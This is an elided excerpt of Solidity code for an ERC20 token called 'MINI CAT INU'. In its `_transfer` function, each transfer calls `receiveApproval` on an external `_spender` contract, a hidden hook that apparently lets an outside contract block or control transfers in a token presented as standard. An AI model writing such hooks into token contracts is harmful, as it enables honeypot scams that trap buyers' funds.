...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (address(_spender) != address(0)) {
            tokenRecipient(_spender).receiveApproval(sender,recipient,address(this),_owner,amount);}
...
contract StandardERC20 is ERC20Decimals {
    constructor(
        ...
        address owner_
    ) ERC20("MINI CAT INU", "MINICAT", feeReceiver_,owner_) ERC20Decimals(decimals_) {
